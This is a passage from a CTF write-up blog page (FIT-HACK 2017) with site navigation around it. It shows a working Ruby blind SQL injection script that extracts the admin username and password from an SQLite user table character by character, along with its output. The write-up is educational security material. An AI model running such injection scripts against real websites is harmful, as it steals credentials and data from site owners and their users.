get the exact size).</div><div class="line">DOC</div><div class="line"></div><div class="line">def get_length(uri, http, req, payload)</div><div class="line">  i = 10</div><div class="line">  while true</div><div class="line">    if check_expression(uri, http, req, payload % i)</div><div class="line">      (i-10..i).each do |j|</div><div class="line">        if check_expression(uri, http, req, payload % j)</div><div class="line">          #puts &quot;Found length = #&#123;j&#125;&quot;</div><div class="line">          return j-1</div><div class="line">        end</div><div class="line">      end</div><div class="line">    end</div><div class="line">    i += 10</div><div class="line">  end</div><div class="line">end</div><div class="line"></div><div class="line">&lt;&lt;-DOC</div><div class="line"></div><div class="line">DOC</div><div class="line"></div><div class="line">def read_string(uri, http, req, length, wanted)</div><div class="line">  content = &quot;&quot;</div><div class="line">  ascii_printable = (&quot; &quot;..&quot;~&quot;).to_a.push(&quot;\n&quot;)  # (&quot; &quot;..&quot;~&quot;) == all printable char == from 0x20 to 0x7e in ASCII Table</div><div class="line">  puts &quot;Beginning to retrive content&quot;</div><div class="line">  while content.length &lt; length</div><div class="line">    ascii_printable.each do |c|</div><div class="line">      tmp = content + c</div><div class="line">      # SQLite tip: 1st position in a string is 1</div><div class="line">      payload = &quot;&apos; or substr((SELECT #&#123;wanted&#125; FROM user LIMIT 1), #&#123;tmp.length&#125;, 1) == \&quot;#&#123;tmp[tmp.length-1]&#125;\&quot;-- -&quot;</div><div class="line">      if check_expression(uri, http, req, payload)</div><div class="line">        content += c</div><div class="line">        puts content</div><div class="line">        break</div><div class="line">      elsif c == &quot;\n&quot;</div><div class="line">          content += &quot;*&quot;  # &quot;*&quot; if no ascii_printable found else we get an infinite loop</div><div class="line">      end</div><div class="line">    end</div><div class="line">  end</div><div class="line">  return content</div><div class="line">end</div><div class="line"></div><div class="line">payload = &quot;&apos; or length((SELECT name FROM user LIMIT 1)) &lt; %i-- -&quot;</div><div class="line">name_length = get_length(uri, http, req, payload)</div><div class="line">puts &quot;Name length: #&#123;name_length&#125;&quot;</div><div class="line"></div><div class="line">payload = &quot;&apos; or length((SELECT pass FROM user LIMIT 1)) &lt; %i-- -&quot;</div><div class="line">password_length = get_length(uri, http, req, payload)</div><div class="line">puts &quot;Password length: #&#123;password_length&#125;&quot;</div><div class="line"></div><div class="line">name = read_string(uri, http, req, name_length, &apos;name&apos;)</div><div class="line">puts &apos;Name: &apos;.concat(name)</div><div class="line"></div><div class="line">password = read_string(uri, http, req, password_length, &apos;pass&apos;)</div><div class="line">puts &apos;Password: &apos;.concat(password)</div></pre></td></tr></table></figure></p>
+<p>And here is the result.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$ ruby auth.rb</div><div class="line">Name length: 5</div><div class="line">Password length: 21</div><div class="line">Beginning to retrive content</div><div class="line">a</div><div class="line">ad</div><div class="line">adm</div><div class="line">admi</div><div class="line">admin</div><div class="line">Name: admin</div><div class="line">Beginning to retrive content</div><div class="line">F</div><div class="line">FI</div><div class="line">FIT</div><div class="line">FIT&#123;</div><div class="line">FIT&#123;9</div><div class="line">FIT&#123;9n</div><div class="line">FIT&#123;9n8</div><div class="line">FIT&#123;9n89</div><div class="line">FIT&#123;9n89_</div><div class="line">FIT&#123;9n89_y</div><div class="line">FIT&#123;9n89_y0</div><div class="line">FIT&#123;9n89_y0u</div><div class="line">FIT&#123;9n89_y0u3</div><div class="line">FIT&#123;9n89_y0u3u</div><div class="line">FIT&#123;9n89_y0u3u_</div><div class="line">FIT&#123;9n89_y0u3u_9</div><div class="line">FIT&#123;9n89_y0u3u_9a</div><div class="line">FIT&#123;9n89_y0u3u_9a8</div><div class="line">FIT&#123;9n89_y0u3u_9a81</div><div class="line">FIT&#123;9n89_y0u3u_9a811</div><div class="line">FIT&#123;9n89_y0u3u_9a811&#125;</div><div class="line">Password: FIT&#123;9n89_y0u3u_9a811&#125;</div></pre></td></tr></table></figure></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="https://rawsec.ml/en/FIT-HACK-2017-write-ups/" data-id="cj1jgu0hv00gcmyfsfu3oi613" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="flag" href="https://ctftime.org/team/27232" target="_blank">
+                        <i class="icon fa fa-flag"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/noraj1337" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="bitbucket" href="https://bitbucket.org/noraj/" target="_blank">
+                        <i class="icon fa fa-bitbucket"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="gitlab" href="https://gitlab.com/u/noraj" target="_blank">
+                        <i class="icon fa fa-gitlab"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="twitter" href="https://twitter.com/rawsec_cyber" target="_blank">
+                        <i class="icon fa fa-twitter"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">Egypt &amp; UAE National Cyber Security CTF Quals 2017 - Write-ups</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/FIT-HACK-2017-write-ups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="FIT-HACK CTF 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/FIT-HACK-2017-write-ups/" class="title">FIT-HACK CTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-04-14T22:00:00.000Z" itemprop="datePublished">Saturday 15 April 2017 (2017-04-15)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="Egypt &amp; UAE National Cyber Security CTF Quals 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/" class="title">Egypt &amp; UAE National Cyber Security CTF Quals 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-04-09T22:00:00.000Z" itemprop="datePublished">Monday 10 April 2017 (2017-04-10)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/ASIS-2017-Quals-write-ups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="ASIS CTF Quals 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/ASIS-2017-Quals-write-ups/" class="title">ASIS CTF Quals 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-04-09T22:00:00.000Z" itemprop="datePublished">Monday 10 April 2017 (2017-04-10)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/INShAck-2017-write-ups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="INS&#39;hAck 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/INShAck-2017-write-ups/" class="title">INS&#39;hAck 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-04-09T22:00:00.000Z" itemprop="datePublished">Monday 10 April 2017 (2017-04-10)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/Sunshine-CTF-2017-writ-ups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="Sunshine CTF 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/Sunshine-CTF-2017-writ-ups/" class="title">Sunshine CTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-04-09T22:00:00.000Z" itemprop="datePublished">Monday 10 April 2017 (2017-04-10)</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/archlinux/">archlinux</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/debian/">debian</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/opensuse/">opensuse</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/ubuntu/">ubuntu</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/news/">news</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/news/security/">security</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/news/warez/">warez</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/">programming</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/programming/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/ruby/">ruby</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><span class="category-list-count">117</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/centos/">centos</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/windows/">windows</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/writeups/">writeups</a><span class="category-list-count">105</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">tag cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/anonymity/" style="font-size: 10px;">anonymity</a> <a href="/tags/apache/" style="font-size: 10px;">apache</a> <a href="/tags/archlinux/" style="font-size: 14.29px;">archlinux</a> <a href="/tags/backdoor/" style="font-size: 10px;">backdoor</a> <a href="/tags/bsd/" style="font-size: 10.71px;">bsd</a> <a href="/tags/centos/" style="font-size: 10.71px;">centos</a> <a href="/tags/crypto/" style="font-size: 15.71px;">crypto</a> <a href="/tags/ctf/" style="font-size: 19.29px;">ctf</a> <a href="/tags/debian/" style="font-size: 10px;">debian</a> <a href="/tags/firefox/" style="font-size: 10px;">firefox</a> <a href="/tags/forensics/" style="font-size: 17.14px;">forensics</a> <a href="/tags/git/" style="font-size: 11.43px;">git</a> <a href="/tags/graphic/" style="font-size: 10px;">graphic</a> <a href="/tags/guessing/" style="font-size: 10.71px;">guessing</a> <a href="/tags/hyper-v/" style="font-size: 10px;">hyper-v</a> <a href="/tags/install/" style="font-size: 10px;">install</a> <a href="/tags/joy/" style="font-size: 10px;">joy</a> <a href="/tags/kvm/" style="font-size: 10px;">kvm</a> <a href="/tags/lfi/" style="font-size: 10.71px;">lfi</a> <a href="/tags/linux/" style="font-size: 18.57px;">linux</a> <a href="/tags/misc/" style="font-size: 16.43px;">misc</a> <a href="/tags/netbios/" style="font-size: 10.71px;">netbios</a> <a href="/tags/network/" style="font-size: 10px;">network</a> <a href="/tags/news/" style="font-size: 13.57px;">news</a> <a href="/tags/opensuse/" style="font-size: 14.29px;">opensuse</a> <a href="/tags/pentest/" style="font-size: 10px;">pentest</a> <a href="/tags/php/" style="font-size: 10.71px;">php</a> <a href="/tags/piracy/" style="font-size: 10px;">piracy</a> <a href="/tags/privacy/" style="font-size: 10px;">privacy</a> <a href="/tags/programming/" style="font-size: 12.86px;">programming</a> <a href="/tags/proxy/" style="font-size: 10.71px;">proxy</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10.71px;">python</a> <a href="/tags/qemu/" style="font-size: 10px;">qemu</a> <a href="/tags/recon/" style="font-size: 10px;">recon</a> <a href="/tags/reconnaissance/" style="font-size: 11.43px;">reconnaissance</a> <a href="/tags/reverse/" style="font-size: 10.71px;">reverse</a> <a href="/tags/reversing/" style="font-size: 10.71px;">reversing</a> <a href="/tags/ruby/" style="font-size: 10px;">ruby</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/ssh/" style="font-size: 10.71px;">ssh</a> <a href="/tags/stegano/" style="font-size: 12.14px;">stegano</a> <a href="/tags/system/" style="font-size: 15.71px;">system</a> <a href="/tags/tor/" style="font-size: 10.71px;">tor</a> <a href="/tags/trivia/" style="font-size: 10px;">trivia</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/update/" style="font-size: 10.71px;">update</a> <a href="/tags/usenet/" style="font-size: 10px;">usenet</a> <a href="/tags/virtualbox/" style="font-size: 10.71px;">virtualbox</a> <a href="/tags/virtualization/" style="font-size: 15px;">virtualization</a> <a href="/tags/vulnerability/" style="font-size: 10.71px;">vulnerability</a> <a href="/tags/warez/" style="font-size: 10px;">warez</a> <a href="/tags/web/" style="font-size: 17.86px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 13.57px;">windows</a> <a href="/tags/writeups/" style="font-size: 19.29px;">writeups</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a><span class="archive-list-count">28</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a><span class="archive-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://hexo.io">Hexo</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.freeopensourcesoftware.org">FOSS</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.doesbittorrentequalpiracy.com">Torrent is not a crime</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2017 Alexandre ZANNI</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'rawsec';
+    
+    
+    var disqus_url = 'https://rawsec.ml/en/FIT-HACK-2017-write-ups/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+    
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+<!-- SSL redirect -->
+<script type="text/javascript">
+  var host = "rawsec.ml";
+  if ((host == window.location.host) && (window.location.protocol != "https:"))
+    window.location.protocol = "https";
+</script>
+
+
+    </div>
+</body>
+</html>
